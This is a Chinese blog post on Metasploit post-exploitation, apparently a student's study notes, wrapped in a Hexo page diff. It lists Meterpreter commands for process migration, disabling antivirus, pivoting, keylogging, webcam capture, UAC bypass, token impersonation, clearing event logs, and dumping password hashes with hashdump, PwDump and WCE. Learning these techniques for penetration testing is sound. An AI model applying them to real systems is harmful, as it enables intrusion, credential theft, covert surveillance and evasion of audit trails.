@@ -1,0 +1,644 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>metasploit（二）——后渗透测试 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="metasploit（二）——后渗透测试">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-05 01:16" pubdate>
+        March 5, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">metasploit（二）——后渗透测试</h1>
+            
+            <div class="markdown-body">
+              <p>今天来学习一下后渗透测试</p>
+<h2 id="meterpreter"><a class="header-anchor" href="#meterpreter">🍭</a>meterpreter</h2>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，在溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后返回一个控制通道（作为攻击载荷获得目标系统的Meterpreter shell的链接）Meterpreter shell有很多功能：添加用户、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息……且Meterpreter能够躲避入侵检测系统，简化任务创建多个会话。可以来利用这些会话进行渗透。<strong>meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</strong></p>
+<h4 id="Meterpreter优势"><a class="header-anchor" href="#Meterpreter优势">🍭</a>Meterpreter优势</h4>
+<ul>
+<li>纯内存工作模式，不需要对磁盘进行任何写入操作。</li>
+<li>使用加密通信协议，而且可以同时与几个信道通信。</li>
+<li>在被攻击进程内工作，不需要创建新的进程。</li>
+<li>易于在多进程之间迁移。</li>
+<li>平台通用，适用于Windows、Linux、BSD系统，支持Intel x86和Intelx64</li>
+</ul>
+<h4 id="常用命令"><a class="header-anchor" href="#常用命令">🍭</a>常用命令</h4>
+<pre><code class="hljs properties"><span class="hljs-meta">?</span> <span class="hljs-string">帮助菜单</span>
+<span class="hljs-attr">channel</span> <span class="hljs-string">显示动态频道的信息</span>
+<span class="hljs-attr">close</span> <span class="hljs-string">关闭一个频道</span>
+<span class="hljs-attr">exit</span> <span class="hljs-string">终止meterpreter会话</span>
+<span class="hljs-attr">help</span> <span class="hljs-string">帮助菜单</span>
+<span class="hljs-attr">interact</span> <span class="hljs-string">频道交互</span>
+<span class="hljs-attr">irb</span> <span class="hljs-string">IRB脚本模式</span>
+<span class="hljs-attr">migrate</span>  <span class="hljs-string">pid  转移meterpreter到其他进程</span>
+<span class="hljs-attr">quit</span> <span class="hljs-string">终止meterpreter</span>
+<span class="hljs-attr">read</span> <span class="hljs-string">从频道读数据</span>
+<span class="hljs-attr">run</span> <span class="hljs-string">执行一个meterpreter脚本</span>
+<span class="hljs-attr">use</span> <span class="hljs-string">加载一个或多个扩展</span>
+<span class="hljs-attr">write</span> <span class="hljs-string">向频道写数据</span>
+<span class="hljs-attr">background</span>  <span class="hljs-string">放回后台</span>
+<span class="hljs-attr">getlwd</span>  <span class="hljs-string">查看本地目录</span>
+<span class="hljs-attr">lcd</span>  <span class="hljs-string">切换本地目录</span>
+<span class="hljs-attr">search</span> <span class="hljs-string">-d c:  -f *.doc  搜索文件</span>
+<span class="hljs-attr">run</span> <span class="hljs-string">post/windows/capture/keylog_recorder   键盘记录</span>
+<span class="hljs-attr">use</span> <span class="hljs-string">priv  加载特权模块</span>
+<span class="hljs-attr">getsystem</span>  <span class="hljs-string">提升到SYSTEM权限</span>
+<span class="hljs-attr">steal_token</span> <span class="hljs-string">&lt;PID&gt;  窃取令牌</span>
+<span class="hljs-attr">rev2self</span>  <span class="hljs-string">恢复原来的令牌 </span>
+<span class="hljs-attr">run</span> <span class="hljs-string">killav  关闭杀毒软件 </span>
+<span class="hljs-attr">run</span> <span class="hljs-string">getgui-e  启用远程桌面</span>
+<span class="hljs-attr">portfwd</span> <span class="hljs-string">add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span>
+<span class="hljs-attr">run</span> <span class="hljs-string">get_local_subnets  获取内网网段信息</span>
+<span class="hljs-attr">run</span> <span class="hljs-string">autoroute -s &lt;内网网段&gt;  创建自动路由</span>
+<span class="hljs-attr">run</span> <span class="hljs-string">autoroute -p  查看自动路由表</span>
+<span class="hljs-attr">sessions</span> <span class="hljs-string">-l 查看会话</span>
+
+<span class="hljs-attr">网络命令：</span>
+<span class="hljs-attr">portfwd</span> <span class="hljs-string">发送一个本地端口到一个远程服务</span>
+<span class="hljs-attr">route</span> <span class="hljs-string">查看和修改路由表</span>
+
+<span class="hljs-attr">系统命令：</span>
+<span class="hljs-attr">clearev</span> <span class="hljs-string">清除事件日志</span>
+<span class="hljs-attr">execute</span> <span class="hljs-string">执行一个命令</span>
+<span class="hljs-attr">getpid</span> <span class="hljs-string">取得当前进程ID</span>
+<span class="hljs-attr">getuid</span> <span class="hljs-string">取得服务器运行用户</span>
+<span class="hljs-attr">kill</span> <span class="hljs-string">杀死一个进程</span>
+<span class="hljs-attr">ps</span> <span class="hljs-string">列出进程列表</span>
+<span class="hljs-attr">reboot</span> <span class="hljs-string">重启远程计算机</span>
+<span class="hljs-attr">reg</span> <span class="hljs-string">修改远程注册表</span>
+<span class="hljs-attr">rev2self</span> <span class="hljs-string">在远程机器调用RevertToSelf()</span>
+<span class="hljs-attr">shell</span> <span class="hljs-string">返回一个cmdshell</span>
+<span class="hljs-attr">shutdown</span> <span class="hljs-string">关闭远程系统</span>
+<span class="hljs-attr">sysinfo</span> <span class="hljs-string">取得远程系统的信息</span>
+
+<span class="hljs-attr">用户接口命令：</span>
+<span class="hljs-attr">enumdesktops</span> <span class="hljs-string">列出所有访问桌面和windows工作站</span>
+<span class="hljs-attr">idletime</span> <span class="hljs-string">远程用户闲置时间</span>
+<span class="hljs-attr">keyscan_dump</span> <span class="hljs-string">转存击键缓存</span>
+<span class="hljs-attr">keyscan_start</span> <span class="hljs-string">开始捕捉击键</span>
+<span class="hljs-attr">keyscan_stop</span> <span class="hljs-string">停止捕捉击键</span>
+<span class="hljs-attr">setdesktop</span> <span class="hljs-string">转移另一个工作站桌面</span>
+<span class="hljs-attr">uictl</span> <span class="hljs-string">用户接口控制</span>
+<span class="hljs-attr">webcam_stream</span> <span class="hljs-string">开启摄像头</span>
+<span class="hljs-attr">screenshot</span>  <span class="hljs-string">截屏</span>
+
+<span class="hljs-attr">密码数据库命令：</span>
+<span class="hljs-attr">hashdump</span> <span class="hljs-string">SAM转储</span>
+
+<span class="hljs-attr">时间戳命令：</span>
+<span class="hljs-attr">timestomp</span> <span class="hljs-string">修改文件时间戳</span></code></pre>
+<h3 id="测试"><a class="header-anchor" href="#测试">🍭</a>测试</h3>
+<p>后渗透测试是建立在成功对目标机器攻击渗透后，故进入meterpreter模块前需在攻击机和目标机之间建立一个shell（不再赘述，按(一)里那样操作）</p>
+<p><img src="/2021/03/05/wei2/1.jpg" srcset="/img/loading.gif" alt="1"></p>
+<p>这次利用的是PHP GCI参数执行漏洞。</p>
+<h4 id="进程迁移"><a class="header-anchor" href="#进程迁移">🍭</a>进程迁移</h4>
+<p>在刚获得Meterpreter Shell时，该Shell极其脆弱和易受攻击的，攻击者可以利用浏览器漏洞攻陷目标机器，但攻击渗透后浏览器有可能被用户关闭。所以第一步就是要移动这个Shell，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p>
+<h5 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h5>
+<p>先<code>ps</code>获取目标机正在运行的进程:</p>
+<img src="/2021/03/05/wei2/ps.jpg" srcset="/img/loading.gif" alt="ps" style="zoom: 67%;">
+<p>再用<code>migrate [pid]</code>命令将shell移动到对应的pid的进程里，进程迁移完原本的shell进程会自动关闭，若无自动关闭可用<code>kill [pid]</code>命令关掉该进程</p>
+<h5 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h5>
+<p>使用<code>run post/linux/manage/migrate</code>命令，系统会自动寻找合适的进程迁移。</p>
+<h4 id="收集系统信息"><a class="header-anchor" href="#收集系统信息">🍭</a>收集系统信息</h4>
+<blockquote>
+<p><code>sysinfo</code>查询信息</p>
+<p><code>run post/linux/gather/checkvm</code>查询目标机是否在虚拟机上运行</p>
+<p><code>idletime</code>查看虚拟机最近运行时间</p>
+<p><code>route</code>查看目标机完整的网络设置</p>
+<p><code>getuid</code>查看已经渗透的用户名</p>
+<p><code>run post/linux/manage/killav</code>关闭杀毒软件</p>
+</blockquote>
+<h4 id="借助被攻击的主机对其它网络进行攻击"><a class="header-anchor" href="#借助被攻击的主机对其它网络进行攻击">🍭</a>借助被攻击的主机对其它网络进行攻击</h4>
+<blockquote>
+<p>先<code>run post/linux/manage/enable_rdp</code>启动远程桌面协议（3389端口）</p>
+<p>再用<code>run post/linux/manage/autoroute</code>查看目标机本地子网</p>
+<p>然后用<code>route add xxx</code>命令添加路由，xxx的值由本地子网中信息决定(在此之前先<code>background</code>将终端隐藏在后台)添加成功后可用<code>route print</code>查看</p>
+</blockquote>
+<h4 id="抓取各种信息"><a class="header-anchor" href="#抓取各种信息">🍭</a>抓取各种信息</h4>
+<blockquote>
+<p>接着用<code>run post/linux/gather/enum_logged_on_users</code>列举登录在目标机上的用户</p>
+<p>再用<code>run post/linux/gather/enum_application</code>列举安装在目标机上的应用</p>
+<p>当用户将某应用设为自动登录时用<code>run windows/gather/credentials/windows_autologin</code>可抓取用户名和密码</p>
+<p>截屏:用<code>screenshot</code>或<code>load espia(加载插件)+screengrab</code></p>
+<p>检查是否有摄像头<code>webcam list</code></p>
+<p>打开摄像头拍照：<code>webcam_snap</code></p>
+<p>开启直播模式<code>webcan_stream</code></p>
+</blockquote>
+<h2 id="提权"><a class="header-anchor" href="#提权">🍭</a>提权</h2>
+<p>通常只获得系统的Guest或User权限无法进行获取Hash、安装软件、修改防火墙规则和修改注册表等各种操作，所以必须将访问权限从Guset提升到User,再到Administrator，最后到System级别。<br>
+渗透的最终目的是获取服务器的最高权限。</p>
+<p>提升权限的方式：<br>
+纵向提权：低权限角色获得高权限角色的权限。<br>
+横向提权：获取同级别角色的权限。</p>
+<h4 id="利用漏洞提权"><a class="header-anchor" href="#利用漏洞提权">🍭</a>利用漏洞提权</h4>
+<blockquote>
+<p>先查看当前权限:<code>whoami/groups</code></p>
+<p>直接<code>getsystem</code>提权,但一般会失败</p>
+<p>查看补丁:<code>sysinfo</code>即可(也可以用wmic查看)</p>
+<p>接下来找提权的EXP，将系统已经安装的补丁编号与提权的EXP编号进行对比，使用没有编号的EXP进行提权,如果用最新的MS16-032(本地溢出漏洞)来尝试提权，对应编号是KB3139914(可在安全焦点或者<code>Exploit-DB</code>查询漏洞的具体信息)</p>
+<p>然后将meterpreter转到后台,搜索MS16-032漏洞,指定session进行提权即可</p>
+</blockquote>
+<h4 id="绕过uac-用户账户控制-提权"><a class="header-anchor" href="#绕过uac-用户账户控制-提权">🍭</a>绕过uac(用户账户控制)提权</h4>
+<p>因为win7以上版本电脑含有UAC,故getsystem提权时一般会失败</p>
+<h5 id="使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC"><a class="header-anchor" href="#使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC">🍭</a>使用ask模块进行弹窗，用户在弹窗点击“是”即可绕过UAC</h5>
+<ul>
+<li><code>use exploit/windows/local/ask</code></li>
+<li>set session 1</li>
+</ul>
+<h5 id="使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell"><a class="header-anchor" href="#使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell">🍭</a>使用bypassuac模块，利用受信任的通过进程注入的发布者证书，产生一个关闭UAC标志的shell</h5>
+<ul>
+<li><code>use exploit/windows/local/bypassuac</code>or<code>use exploit/windows/local/bypassuac</code></li>
+<li>set session 1</li>
+</ul>
+<h2 id="令牌窃取"><a class="header-anchor" href="#令牌窃取">🍭</a>令牌窃取</h2>
+<p>token之前介绍过了,这里做个补充</p>
+<p>令牌种类:</p>
+<ul>
+<li>
+<p>访问令牌(Access Token)表示访问控制操作主题的系统对象</p>
+</li>
+<li>
+<p>密保令牌(Security token),又叫作认证令牌或者硬件令牌，是一种计算机身份校验的物理设备</p>
+</li>
+<li>
+<p>会话令牌(Session Token)是交互会话中唯一的身份标识符</p>
+</li>
+</ul>
+<h4 id="Kerberos协议"><a class="header-anchor" href="#Kerberos协议">🍭</a>Kerberos协议</h4>
+<p><img src="/2021/03/05/wei2/1.png" srcset="/img/loading.gif" alt="1"></p>
+<h4 id="步骤"><a class="header-anchor" href="#步骤">🍭</a>步骤</h4>
+<blockquote>
+<p>先<code>use incognito</code>加载功能</p>
+<p>再<code>list_tokens -u </code> 列出目标主机用户的可用令牌</p>
+<blockquote>
+<p>一般有两种类型的令牌：</p>
+<p><code>Delegation Tokens</code>(授权令牌)支持交互式登录</p>
+<p><code>Impersonation Tokens</code>(模拟令牌),非交互的会话</p>
+<p>令牌的数量取决于Meterpreter Shell的访问级别</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>从得到的信息中可以看到有效令牌其格式为<code>主机名\登录的用户名</code></p>
+<p>调用<code>impersonate_token HOSTNAME\\USERNAME </code> 假冒目标主机上的可用令牌</p>
+<p>假冒成功🌞🌞🌞</p>
+</blockquote>
+<h4 id="清除事件日志"><a class="header-anchor" href="#清除事件日志">🍭</a>清除事件日志</h4>
+<p>完成攻击操作之后使用命令“clearev”命令清除事件日志</p>
+<h2 id="HASH攻击"><a class="header-anchor" href="#HASH攻击">🍭</a>HASH攻击</h2>
+<h4 id="hashdump"><a class="header-anchor" href="#hashdump">🍭</a>hashdump</h4>
+<p>Hashdump Meterpreter脚本可以从目标机器中提取Hash值，破解Hash值即可获得登录密码。计算机中的每个账号的用户名和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，要想访问就必须有“系统级”账号。所以要使用该命令就必须进行权限的提升。</p>
+<ul>
+<li><code>hashdump</code>(只能在system级权限下)</li>
+<li><code>smart_hashdump</code>模块,<strong>在window中因为有UAC故要先绕过它</strong></li>
+</ul>
+<h4 id="Quarks-PwDump"><a class="header-anchor" href="#Quarks-PwDump">🍭</a>Quarks PwDump</h4>
+<p>在Windows系统中，密码以加密的方式保存在/windows/system32cm下的sam文件里，账号在登录后会将密码的密文和明文保存在系统的内存中。情况下系统启动后，sam文件是不能被读取的，但PwDump可以.</p>
+<p>参数:</p>
+<blockquote>
+<p>-dhl：导出本地哈希值。<br>
+-dhdc：导出内存中的域控哈希值。<br>
+-dhd：导出域控哈希值，必须指定NTDS文件。<br>
+-db：导出Bitlocker信息，必须指定NTDS文件。<br>
+-nt：导出NTDS文件。<br>
+-hist:导出历史信息，可选项。<br>
+-t：可选导出类型，默认导出John类型。<br>
+-0：导出文件到本地。</p>
+</blockquote>
+<h4 id="Windows-Credentials-Editor"><a class="header-anchor" href="#Windows-Credentials-Editor">🍭</a>Windows Credentials Editor</h4>
+<p>WCE能列举登录会话，添加、改变和删除相关凭据(例如LM/NT Hash)。这些功能在内网渗透中能够被利用,但必须在管理员权限下使用，还要注意杀毒工具的免杀。</p>
+<blockquote>
+<p>先用<code>upload/root/wce.exe c:\</code>命令将wce.exe上传到目标主机C盘中</p>
+<p>然后在目标机Shell下用<code>wce-w</code>提取系统明文管理员的密码</p>
+</blockquote>
+<p>参数:</p>
+<blockquote>
+<p>-l   读取数据格式<code>username:domain:lm：ntlm</code>(从内存中读取已经登录的信息,默认的读取方式是先用安的方式读取，若读取失败再用不安全的方式，</p>
+<p>-f   强制使用安全的方式读取</p>
+<p>-g  计算密码，制定一个系统明文会使用的加密方法来计算密文</p>
+<p>-c  指定会话执行cmd</p>
+<p>-v  显示详细信息</p>
+<p>-w  查看已登录的明文密码</p>
+<p>-s  更改当前登录会话的NTLM凭据。参数:&lt;用户名&gt;:&lt;域名&gt;:&lt; LMHash &gt;: &lt; NTHash &gt;</p>
+<p>-r  无限期地列出登录会话和NTLM凭证。如果发现新的会话，每5秒刷新一次;可选:- r &lt;刷新间隔&gt;</p>
+<p>-e  无限期地列出登录会话NTLM凭证。每次发生登录事件时刷新</p>
+<p>-o  将所有输出保存到文件中。参数:&lt;文件名&gt;</p>
+<p>-i  指定LUID而不是使用当前登录会话。参数:&lt; luid &gt;</p>
+<p>-d  从登录会话中删除NTLM凭证。参数:&lt; luid &gt;</p>
+</blockquote>
+<p>科普完成☀️☀️☀️</p>
+<p>参考:</p>
+<p>《web安全攻防渗透测试实战指南》</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/106311397">https://blog.csdn.net/smli_ng/article/details/106311397</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/27/wei1/">
+                        <span class="hidden-mobile">Metasploit(一)——入门测试</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
